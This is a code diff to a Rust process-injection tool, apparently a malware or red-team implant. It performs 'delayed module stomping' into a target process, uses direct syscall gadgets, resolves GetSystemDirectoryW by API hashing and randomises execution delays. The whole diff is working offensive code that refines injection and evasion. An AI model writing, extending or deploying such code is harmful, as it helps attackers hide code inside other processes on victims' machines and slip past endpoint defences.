@@ -30,12 +30,12 @@
 use crate::injection_engine::{InjectionError, InjectionHandle, InjectionTechnique};
 use crate::syscalls::{do_syscall, get_syscall_id};
 use anyhow::{anyhow, Context, Result};
+use rand::Rng;
 use std::ffi::c_void;
 use std::sync::OnceLock;
 
 // ── Constants ────────────────────────────────────────────────────────────────
 
-const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;
 const MEM_COMMIT: u32 = 0x00001000;
 const MEM_RESERVE: u32 = 0x00002000;
 const PAGE_READWRITE: u32 = 0x04;
@@ -189,6 +189,23 @@ impl Drop for PendingStomp {
             unsafe { std::ptr::write_volatile(b, 0) }
         }
         std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
+
+        // Close the process handle (opened via NtOpenProcess in phase1_load).
+        // If ownership was transferred to InjectionHandle via phase2_stomp_and_execute,
+        // the handle may already be closed — NtClose will return an error we ignore.
+        if self.process_handle != 0 {
+            if let Ok(t) = crate::syscalls::get_syscall_id("NtClose") {
+                let _ = unsafe {
+                    crate::syscalls::do_syscall(t.ssn, t.gadget_addr, &[self.process_handle as u64])
+                };
+                log::debug!(
+                    "[delayed-stomp] PendingStomp drop: closed process handle {:#x} for PID {}",
+                    self.process_handle,
+                    self.target_pid
+                );
+            }
+            self.process_handle = 0;
+        }
     }
 }
 
@@ -973,7 +990,9 @@ pub unsafe fn phase1_load(
             target.gadget_addr,
             &[
                 &mut process_handle as *mut _ as u64,
-                PROCESS_ALL_ACCESS as u64,
+                // PROCESS_VM_WRITE (0x0020) | PROCESS_VM_OPERATION (0x0008) |
+                // PROCESS_QUERY_INFORMATION (0x0400) | PROCESS_CREATE_THREAD (0x0002)
+                (0x0020u32 | 0x0008 | 0x0400 | 0x0002) as u64,
                 std::ptr::null_mut::<c_void>() as u64, // ObjectAttributes
                 &cid as *const _ as *mut c_void as u64,
             ],
@@ -997,8 +1016,32 @@ pub unsafe fn phase1_load(
         target_pid
     );
 
-    // Build full path (System32)
-    let dll_path = format!("C:\\Windows\\System32\\{}", dll_name);
+    // Build full path — resolve system directory dynamically to support
+    // non-standard Windows installations (e.g. D:\Windows).
+    let system_dir = {
+        let mut buf = [0u16; 260];
+        let kernel32 = pe_resolve::get_module_handle_by_hash(
+            pe_resolve::hash_str(b"kernel32.dll\0"),
+        );
+        let get_sys_dir: Option<unsafe extern "system" fn(*mut u16, u32) -> u32> =
+            kernel32.and_then(|base| {
+                pe_resolve::get_proc_address_by_hash(
+                    base,
+                    pe_resolve::hash_str(b"GetSystemDirectoryW\0"),
+                )
+                .map(|a| unsafe { std::mem::transmute(a) })
+            });
+        let len = match get_sys_dir {
+            Some(f) => unsafe { f(buf.as_mut_ptr(), buf.len() as u32) },
+            None => 0,
+        };
+        if len == 0 {
+            String::from("C:\\Windows\\System32")
+        } else {
+            String::from_utf16_lossy(&buf[..len as usize])
+        }
+    };
+    let dll_path = format!("{}\\{}", system_dir, dll_name);
 
     // Load the DLL into the target process
     load_dll_remote(process_handle as *mut c_void, &dll_path)
@@ -1043,13 +1086,7 @@ pub unsafe fn phase1_load(
     let delay_secs = if min_delay_secs >= max_delay_secs {
         max_delay_secs
     } else {
-        // Simple LCG-based random in range
-        let now = std::time::SystemTime::now()
-            .duration_since(std::time::UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_nanos() as u32;
-        let range = max_delay_secs - min_delay_secs;
-        min_delay_secs + (now.wrapping_mul(1103515245).wrapping_add(12345) % range)
+        min_delay_secs + rand::thread_rng().gen_range(0..(max_delay_secs - min_delay_secs))
     };
 
     log::info!(
